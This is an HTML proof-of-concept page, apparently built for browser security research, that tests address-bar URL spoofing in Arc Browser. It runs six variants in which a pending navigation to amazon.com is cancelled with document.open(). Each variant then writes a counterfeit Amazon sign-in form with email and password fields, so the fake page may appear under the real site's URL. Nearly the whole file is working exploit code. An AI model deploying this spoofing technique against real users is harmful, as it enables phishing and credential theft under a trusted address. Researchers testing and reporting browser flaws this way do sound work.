<!DOCTYPE html>
<html>
<head>
<title>PoC 5: document.open + Navigation Cancel</title>
<!--
  PoC 5: document.open() + Navigation Cancellation URL Persistence

  Target: Arc Browser (Chromium 146+)

  Technique: Based on Chromium issue 40096164. If a page calls
  location.reload() followed by document.open(), the pending navigation
  is cancelled but the pending URL may persist in the address bar.

  The original fix clears the NavigationEntry in the NavigationRequest
  destructor. This PoC tests variants that might cancel navigations
  through different code paths that don't trigger the same cleanup.

  Variants:
  A) location.reload() + document.open() (classic, likely patched)
  B) form.submit() + document.open() (different navigation initiator)
  C) meta refresh + document.open() (client redirect path)
  D) anchor click + document.open() (simulated user navigation)
  E) history.go(0) + document.open() (same-doc reload path)
-->
</head>
<body style="font-family: -apple-system, BlinkMacSystemFont, sans-serif; padding: 40px; background: #f5f5f5;">
<h2>PoC 5: document.open + Navigation Cancel</h2>
<p>Tests whether cancelling a pending navigation via document.open() leaves the pending URL visible.</p>

<button onclick="testVariantA()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
  A: reload() + document.open()
</button>
<button onclick="testVariantB()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
  B: form.submit() + document.open()
</button>
<button onclick="testVariantC()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
  C: meta refresh + document.open()
</button>
<button onclick="testVariantD()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
  D: anchor click + document.open()
</button>
<button onclick="testVariantE()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
  E: history.go(0) + document.open()
</button>
<button onclick="testVariantF()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
  F: window.open + document.open race
</button>

<div id="log" style="margin-top: 20px; padding: 16px; background: #1a1a1a; color: #0f0; font-family: monospace; font-size: 13px; border-radius: 8px; max-height: 400px; overflow-y: auto;"></div>

<!-- Hidden form for Variant B -->
<form id="hiddenForm" action="https://www.amazon.com/" method="GET" style="display:none;">
  <input type="hidden" name="ref" value="test">
</form>

<!-- Hidden anchor for Variant D -->
<a id="hiddenLink" href="https://www.amazon.com/" style="display:none;">Amazon</a>

<script>
function log(msg) {
  const el = document.getElementById('log');
  if (el) el.innerHTML += msg + '<br>';
}

// Variant A: Classic location.reload() + document.open()
// Chromium issue 40096164 pattern
function testVariantA() {
  log('[A] Starting reload + document.open variant...');

  // First, change the URL via pushState so we have something "interesting"
  // to see if the pending URL persists
  history.replaceState({}, '', '/account/login');
  log('[A] URL changed to /account/login via replaceState');

  // Initiate reload (creates a pending navigation)
  location.reload();

  // Immediately call document.open to cancel the reload
  // If the fix doesn't cover this path, the pending URL persists
  document.open();
  document.write(`
    <html>
    <head><title>Amazon - Sign In</title></head>
    <body style="font-family:Arial;max-width:400px;margin:40px auto;padding:20px;">
      <h2>Sign In</h2>
      <p>Your session expired. Please sign in again.</p>
      <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
      <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
      <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
      <p style="margin-top:12px;font-size:12px;color:#555;">
        CHECK: What URL does the address bar show?<br>
        If it shows the pending reload URL instead of about:blank = BUG
      </p>
    </body>
    </html>
  `);
  document.close();
}

// Variant B: Form submission creates a different type of navigation
function testVariantB() {
  log('[B] Starting form.submit() + document.open variant...');

  const form = document.getElementById('hiddenForm');

  // Submit the form (initiates navigation to amazon.com)
  form.submit();

  // Immediately cancel with document.open
  // Form submissions go through a different navigation path
  setTimeout(() => {
    document.open();
    document.write(`
      <html>
      <head><title>Amazon - Sign In</title></head>
      <body style="font-family:Arial;max-width:400px;margin:40px auto;padding:20px;">
        <h2>Account Verification Required</h2>
        <p>Amazon requires additional verification for your account.</p>
        <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
        <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
        <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Verify</button>
        <p style="font-size:12px;color:#555;margin-top:12px;">
          CHECK: Does address bar show amazon.com? If yes = BUG
        </p>
      </body>
      </html>
    `);
    document.close();
  }, 0);
}

// Variant C: Meta refresh creates a client redirect navigation
function testVariantC() {
  log('[C] Starting meta refresh + document.open variant...');

  // Add a meta refresh that navigates to amazon
  const meta = document.createElement('meta');
  meta.httpEquiv = 'refresh';
  meta.content = '0;url=https://www.amazon.com/';
  document.head.appendChild(meta);

  log('[C] Meta refresh added, navigation pending...');

  // Cancel with document.open before the meta refresh completes
  setTimeout(() => {
    document.open();
    document.write(`
      <html>
      <head><title>Amazon.com Shopping</title></head>
      <body style="font-family:Arial;max-width:400px;margin:40px auto;padding:20px;">
        <h2>Welcome Back</h2>
        <p>Please sign in to continue shopping.</p>
        <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
        <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
        <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
        <p style="font-size:12px;color:#555;margin-top:12px;">
          CHECK: Does the address bar show amazon.com?
        </p>
      </body>
      </html>
    `);
    document.close();
  }, 0);
}

// Variant D: Programmatic anchor click
function testVariantD() {
  log('[D] Starting anchor click + document.open variant...');

  // Click the hidden link (simulates navigation to amazon)
  const link = document.getElementById('hiddenLink');

  // Create a mouse event to simulate a real click
  const event = new MouseEvent('click', {
    bubbles: true,
    cancelable: true,
    view: window
  });
  link.dispatchEvent(event);

  log('[D] Link clicked, navigation to amazon.com initiated...');

  // Race to cancel with document.open
  setTimeout(() => {
    document.open();
    document.write(`
      <html>
      <head><title>Amazon.com</title></head>
      <body style="font-family:Arial;max-width:400px;margin:40px auto;padding:20px;">
        <h2>Session Expired</h2>
        <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
        <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
        <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Continue</button>
      </body>
      </html>
    `);
    document.close();
  }, 0);
}

// Variant E: history.go(0) is a same-document reload
function testVariantE() {
  log('[E] Starting history.go(0) + document.open variant...');

  // Change URL to something meaningful
  history.replaceState({}, '', '/signin');

  // Same-document reload
  history.go(0);

  // Cancel immediately
  document.open();
  document.write(`
    <html>
    <head><title>Sign In</title></head>
    <body style="font-family:Arial;max-width:400px;margin:40px auto;padding:20px;">
      <h2>Sign In Required</h2>
      <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
      <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
      <button style="width:100%;padding:10px;background:#007bff;color:#fff;border:none;border-radius:4px;cursor:pointer;">Sign In</button>
      <p style="font-size:12px;color:#555;margin-top:12px;">
        CHECK: Is the URL bar showing /signin or the original page URL?
      </p>
    </body>
    </html>
  `);
  document.close();
}

// Variant F: window.open to target, then race document.open on the popup
function testVariantF() {
  log('[F] Starting window.open + document.open race variant...');

  // Open popup to amazon (renderer-initiated, new tab)
  const popup = window.open('https://www.amazon.com/');

  if (!popup) {
    log('[F] Popup blocked. Allow popups for this site.');
    return;
  }

  log('[F] Popup opened to amazon.com');

  // In a new, unmodified tab, renderer-initiated navigations DO show
  // the pending URL. Race to inject content via document.open before
  // Chromium detects the access.
  const attempts = [0, 1, 2, 5, 10, 20, 50, 100, 150, 200, 300, 500];

  attempts.forEach(delay => {
    setTimeout(() => {
      try {
        // document.open on the popup's initial empty document
        popup.document.open();
        popup.document.write(`
          <html>
          <head><title>Amazon.com</title></head>
          <body style="font-family:Arial;padding:40px;">
            <h1 style="color:#ff9900;">amazon</h1>
            <h2>Sign In</h2>
            <p>Injected at delay: ${delay}ms</p>
            <input type="email" placeholder="Email" style="width:300px;padding:10px;display:block;margin:8px 0;border:1px solid #ccc;border-radius:4px;">
            <input type="password" placeholder="Password" style="width:300px;padding:10px;display:block;margin:8px 0;border:1px solid #ccc;border-radius:4px;">
            <button style="padding:10px 30px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
          </body>
          </html>
        `);
        popup.document.close();
        log('[F] Content injected at ' + delay + 'ms! Check popup address bar.');
      } catch(e) {
        // Cross-origin or access denied
        if (delay === attempts[attempts.length - 1]) {
          log('[F] All injection attempts failed: ' + e.message);
        }
      }
    }, delay);
  });
}
</script>
</body>
</html>
